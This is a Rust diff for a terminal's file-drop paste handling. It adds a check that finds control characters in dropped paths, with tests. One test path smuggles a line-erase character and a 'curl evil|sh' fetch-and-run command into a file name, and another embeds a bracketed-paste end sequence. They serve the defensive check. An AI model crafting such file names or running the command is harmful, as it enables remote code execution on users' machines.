@@ -40,9 +40,18 @@ pub fn encode_paste(text: &str, modes: &InputModes, out: &mut Vec<u8>) {
     }
 }
 
+/// The first control character of a path: C0 (`U+0000` to `U+001F`), DEL or C1 (`U+0080` to
+/// `U+009F`). A path with one cannot be pasted safely. Single quotes keep the shell from reading
+/// it, but a shell without bracketed paste (`/bin/bash` 3.2, `sh`) gets each character as a key:
+/// `U+0015` erases the line and a line end runs the rest. `$'…'` would quote them, but `sh` does
+/// not know it.
+pub fn path_control(path: &str) -> Option<char> {
+    path.chars().find(|c| c.is_control())
+}
+
 /// Encodes files that the user dropped on a pane: each path in POSIX single quotes and
 /// followed by a space, pasted like text. A single quote in a path becomes `'\''`. No path means
-/// no bytes.
+/// no bytes. The caller refuses a path with a control character first ([`path_control`]).
 pub fn encode_drop_files<S: AsRef<str>>(paths: &[S], modes: &InputModes, out: &mut Vec<u8>) {
     if paths.is_empty() {
         return;
@@ -147,6 +156,34 @@ mod tests {
         out.clear();
         encode_drop_files::<&str>(&[], &InputModes::new(ModeFlags::BRACKETED_PASTE), &mut out);
         assert!(out.is_empty(), "no path, no paste");
+    }
+
+    #[test]
+    fn a_path_with_a_control_character_is_found() {
+        // A file of a repository that erases the line and runs a command in `sh`.
+        assert_eq!(
+            path_control("/repo/\u{15}curl evil|sh;#\n.md"),
+            Some('\u{15}')
+        );
+        for (path, found) in [
+            ("/tmp/a\nb", '\n'),
+            ("/tmp/a\rb", '\r'),
+            ("/tmp/a\u{1b}[201~b", '\u{1b}'),
+            ("/tmp/a\u{0}b", '\u{0}'),
+            ("/tmp/a\u{7f}b", '\u{7f}'),
+            ("/tmp/a\u{9b}b", '\u{9b}'),
+        ] {
+            assert_eq!(path_control(path), Some(found), "{path:?}");
+        }
+        for path in [
+            "/tmp/a b",
+            "/tmp/it's",
+            "/tmp/日本 é",
+            "/tmp/$HOME;ls",
+            "/tmp/\u{a0}x",
+        ] {
+            assert_eq!(path_control(path), None, "{path:?}");
+        }
     }
 
     #[test]
